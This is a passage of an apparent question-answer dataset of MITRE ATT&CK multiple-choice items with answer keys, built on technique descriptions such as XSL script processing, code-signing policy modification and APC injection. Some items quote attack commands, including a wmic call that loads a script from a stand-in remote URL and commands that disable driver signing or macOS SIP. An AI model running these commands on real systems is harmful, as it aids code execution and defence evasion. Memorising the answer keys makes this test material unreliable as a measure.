        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.\n\nPossible answers:\nA. Network Service Discovery, B. Pre-OS Boot: System Firmware, C. Scheduled Task/Job, D. Gather Victim Identity Information: Credentials",
    "context": "",
    "output": "A. Network Service Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
      "options": "A. Network Service Discovery, B. Pre-OS Boot: System Firmware, C. Scheduled Task/Job, D. Gather Victim Identity Information: Credentials",
      "choice": "A. Network Service Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\nA. Boot or Logon Autostart Execution: LSASS Driver, B. Brute Force: Password Guessing, C. Active Scanning, D. Indicator Removal\nAnswer:",
    "context": "",
    "output": "D. Indicator Removal",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
      "options": "A. Boot or Logon Autostart Execution: LSASS Driver, B. Brute Force: Password Guessing, C. Active Scanning, D. Indicator Removal",
      "choice": "D. Indicator Removal",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.\n\nPossible answers:\nA. Unsecured Credentials: Credentials in Registry, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Exploitation for Client Execution, D. Encrypted Channel: Symmetric Cryptography",
    "context": "",
    "output": "C. Exploitation for Client Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "options": "A. Unsecured Credentials: Credentials in Registry, B. Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access, C. Exploitation for Client Execution, D. Encrypted Channel: Symmetric Cryptography",
      "choice": "C. Exploitation for Client Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\nA. Boot or Logon Initialization Scripts: Logon Script (Windows), B. Hide Artifacts: NTFS File Attributes, C. Indicator Removal: Clear Network Connection History and Configurations, D. Search Open Websites/Domains: Code Repositories\nA:",
    "context": "",
    "output": "A. Boot or Logon Initialization Scripts: Logon Script (Windows)",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
      "options": "A. Boot or Logon Initialization Scripts: Logon Script (Windows), B. Hide Artifacts: NTFS File Attributes, C. Indicator Removal: Clear Network Connection History and Configurations, D. Search Open Websites/Domains: Code Repositories",
      "choice": "A. Boot or Logon Initialization Scripts: Logon Script (Windows)",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.\n\nA. Container and Resource Discovery, B. Web Service: One-Way Communication, C. Proxy: External Proxy, D. Acquire Infrastructure\nAnswer:",
    "context": "",
    "output": "C. Proxy: External Proxy",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "options": "A. Container and Resource Discovery, B. Web Service: One-Way Communication, C. Proxy: External Proxy, D. Acquire Infrastructure",
      "choice": "C. Proxy: External Proxy",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.\n\nA. Gather Victim Network Information: Network Security Appliances, B. Subvert Trust Controls: Code Signing Policy Modification, C. Event Triggered Execution: Unix Shell Configuration Modification, D. Data Obfuscation: Junk Data\nAnswer:",
    "context": "",
    "output": "B. Subvert Trust Controls: Code Signing Policy Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.",
      "options": "A. Gather Victim Network Information: Network Security Appliances, B. Subvert Trust Controls: Code Signing Policy Modification, C. Event Triggered Execution: Unix Shell Configuration Modification, D. Data Obfuscation: Junk Data",
      "choice": "B. Subvert Trust Controls: Code Signing Policy Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.\n\nPossible answers:\nA. Input Capture: Keylogging, B. Cloud Administration Command, C. Data Obfuscation: Junk Data, D. Encrypted Channel",
    "context": "",
    "output": "D. Encrypted Channel",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
      "options": "A. Input Capture: Keylogging, B. Cloud Administration Command, C. Data Obfuscation: Junk Data, D. Encrypted Channel",
      "choice": "D. Encrypted Channel",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. \n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.\n\nCommand-line examples:\n\n* <code>msxsl.exe customers.xml script.xsl</code>\n* <code>msxsl.exe script.xsl script.xsl</code>\n* <code>msxsl.exe script.jpeg script.jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.\n\nCommand-line examples:\n\n* Local File: <code>wmic process list /FORMAT:evil.xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps://example.com/evil.xsl\u201d</code>\n\nPossible answers:\nA. Hide Artifacts: File/Path Exclusions, B. XSL Script Processing, C. Office Application Startup: Outlook Rules, D. Container Administration Command",
    "context": "",
    "output": "B. XSL Script Processing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. \n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.\n\nCommand-line examples:\n\n* <code>msxsl.exe customers.xml script.xsl</code>\n* <code>msxsl.exe script.xsl script.xsl</code>\n* <code>msxsl.exe script.jpeg script.jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.\n\nCommand-line examples:\n\n* Local File: <code>wmic process list /FORMAT:evil.xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps://example.com/evil.xsl\u201d</code>",
      "options": "A. Hide Artifacts: File/Path Exclusions, B. XSL Script Processing, C. Office Application Startup: Outlook Rules, D. Container Administration Command",
      "choice": "B. XSL Script Processing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.\n\nOptions:\nA. Search Open Technical Databases: Digital Certificates, B. Boot or Logon Autostart Execution: Re-opened Applications, C. Exploitation for Privilege Escalation, D. Stage Capabilities: Upload Malware",
    "context": "",
    "output": "D. Stage Capabilities: Upload Malware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Boot or Logon Autostart Execution: Re-opened Applications, C. Exploitation for Privilege Escalation, D. Stage Capabilities: Upload Malware",
      "choice": "D. Stage Capabilities: Upload Malware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various the technique techniques.\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.\n\nPossible answers:\nA. Compromise Infrastructure: DNS Server, B. Scheduled Task/Job: Systemd Timers, C. Browser Session Hijacking, D. Data Encoding: Non-Standard Encoding",
    "context": "",
    "output": "C. Browser Session Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various the technique techniques.\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.",
      "options": "A. Compromise Infrastructure: DNS Server, B. Scheduled Task/Job: Systemd Timers, C. Browser Session Hijacking, D. Data Encoding: Non-Standard Encoding",
      "choice": "C. Browser Session Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials. In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.\n\nA. Modify Authentication Process: Hybrid Identity, B. Forge Web Credentials, C. Serverless Execution, D. Indicator Removal: Clear Persistence\nAnswer:",
    "context": "",
    "output": "A. Modify Authentication Process: Hybrid Identity",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials. In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.",
      "options": "A. Modify Authentication Process: Hybrid Identity, B. Forge Web Credentials, C. Serverless Execution, D. Indicator Removal: Clear Persistence",
      "choice": "A. Modify Authentication Process: Hybrid Identity",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.\n\nA. Process Injection: Thread Local Storage, B. Remote Services: Cloud Services, C. Process Injection: Asynchronous Procedure Call, D. Remote Services\nAnswer:",
    "context": "",
    "output": "C. Process Injection: Asynchronous Procedure Call",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Process Injection: Thread Local Storage, B. Remote Services: Cloud Services, C. Process Injection: Asynchronous Procedure Call, D. Remote Services",
      "choice": "C. Process Injection: Asynchronous Procedure Call",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .\n\nA. Unsecured Credentials: Chat Messages, B. Remote Access Software, C. Indicator Removal, D. Process Injection: Thread Local Storage\nA:",
    "context": "",
    "output": "A. Unsecured Credentials: Chat Messages",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
